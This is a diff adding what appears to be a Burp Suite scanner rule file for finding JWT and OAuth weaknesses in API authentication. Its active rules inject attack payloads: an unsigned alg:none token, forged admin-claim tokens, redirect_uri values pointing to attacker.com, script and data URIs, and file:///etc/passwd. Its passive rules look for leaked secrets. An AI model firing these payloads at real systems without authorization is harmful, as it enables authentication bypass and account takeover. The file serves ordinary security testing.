@@ -1,0 +1,168 @@
+# JWT and OAuth Security Bambda
+# Detects JWT and OAuth vulnerabilities in API authentication
+
+metadata:
+  name: "JWT/OAuth Security"
+  description: "Detects JWT and OAuth vulnerabilities including algorithm confusion, token manipulation, and OAuth redirect bypasses"
+  author: "Burp Automation Tool"
+  version: "1.0.0"
+  tags: ["jwt", "oauth", "authentication", "tokens", "bearer"]
+
+rules:
+  - name: "JWT Algorithm Confusion"
+    description: "Detects JWT algorithm confusion attacks"
+    severity: "High"
+    confidence: "Medium"
+    
+    active:
+      - when: "request"
+        where: "request.headers"
+        inject:
+          - payload: "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."
+          - payload: "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.EGIM96RAZx35lJzdJsyH-qQwv8Hdp7fsn3WYASBpx7Y"
+        then:
+          - if: "response.status == 200"
+            issue: "JWT Algorithm Confusion"
+            detail: "JWT algorithm confusion attack successful"
+            severity: "High"
+            confidence: "High"
+
+  - name: "JWT Token Expiration"
+    description: "Detects expired or invalid JWT tokens"
+    severity: "Medium"
+    confidence: "High"
+    
+    passive:
+      - when: "response"
+        where: "response.body"
+        matches:
+          - pattern: "token.*expired"
+            flags: "i"
+          - pattern: "jwt.*expired"
+            flags: "i"
+          - pattern: "exp.*[0-9]{10}"
+            flags: "i"
+        then:
+          - issue: "JWT Token Expiration"
+            detail: "JWT token expiration information exposed"
+            severity: "Medium"
+            confidence: "High"
+
+  - name: "JWT Token Manipulation"
+    description: "Detects JWT token manipulation attempts"
+    severity: "High"
+    confidence: "Medium"
+    
+    active:
+      - when: "request"
+        where: "request.headers"
+        inject:
+          - payload: "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsIm5hbWUiOiJBZG1pbiBVc2VyIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature"
+          - payload: "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature"
+        then:
+          - if: "response.status == 200"
+            issue: "JWT Token Manipulation"
+            detail: "JWT token manipulation successful"
+            severity: "High"
+            confidence: "High"
+
+  - name: "OAuth Redirect URI Bypass"
+    description: "Detects OAuth redirect URI bypass vulnerabilities"
+    severity: "High"
+    confidence: "Medium"
+    
+    active:
+      - when: "request"
+        where: "request.parameters"
+        inject:
+          - payload: "redirect_uri=https://attacker.com/callback"
+          - payload: "redirect_uri=javascript:alert('OAuth bypass')"
+          - payload: "redirect_uri=data:text/html,<script>alert('OAuth bypass')</script>"
+          - payload: "redirect_uri=file:///etc/passwd"
+        then:
+          - if: "response.body contains redirect_uri"
+            issue: "OAuth Redirect URI Bypass"
+            detail: "OAuth redirect URI bypass successful"
+            severity: "High"
+            confidence: "High"
+
+  - name: "OAuth State Parameter Bypass"
+    description: "Detects OAuth state parameter bypass vulnerabilities"
+    severity: "Medium"
+    confidence: "Medium"
+    
+    active:
+      - when: "request"
+        where: "request.parameters"
+        inject:
+          - payload: "state=null"
+          - payload: "state=undefined"
+          - payload: "state=attacker_state"
+        then:
+          - if: "response.status == 200"
+            issue: "OAuth State Parameter Bypass"
+            detail: "OAuth state parameter bypass successful"
+            severity: "Medium"
+            confidence: "Medium"
+
+  - name: "OAuth Client ID Manipulation"
+    description: "Detects OAuth client ID manipulation"
+    severity: "High"
+    confidence: "Medium"
+    
+    active:
+      - when: "request"
+        where: "request.parameters"
+        inject:
+          - payload: "client_id=admin"
+          - payload: "client_id=internal"
+          - payload: "client_id=system"
+        then:
+          - if: "response.body contains access_token"
+            issue: "OAuth Client ID Manipulation"
+            detail: "OAuth client ID manipulation successful"
+            severity: "High"
+            confidence: "High"
+
+  - name: "JWT Secret Exposure"
+    description: "Detects JWT secret exposure in responses"
+    severity: "High"
+    confidence: "High"
+    
+    passive:
+      - when: "response"
+        where: "response.body"
+        matches:
+          - pattern: "jwt_secret"
+            flags: "i"
+          - pattern: "jwt_key"
+            flags: "i"
+          - pattern: "secret.*[a-zA-Z0-9]{32,}"
+            flags: "i"
+        then:
+          - issue: "JWT Secret Exposure"
+            detail: "JWT secret exposed in response"
+            severity: "High"
+            confidence: "High"
+
+filters:
+  - name: "Authentication Endpoints"
+    when: "request"
+    where: "request.url"
+    include:
+      - pattern: "/auth"
+        flags: "i"
+      - pattern: "/oauth"
+        flags: "i"
+      - pattern: "/login"
+        flags: "i"
+      - pattern: "/token"
+        flags: "i"
+      - pattern: "/jwt"
+        flags: "i"
+
+settings:
+  max_payloads_per_parameter: 10
+  timeout: 10000
+  follow_redirects: true
+  respect_robots_txt: false
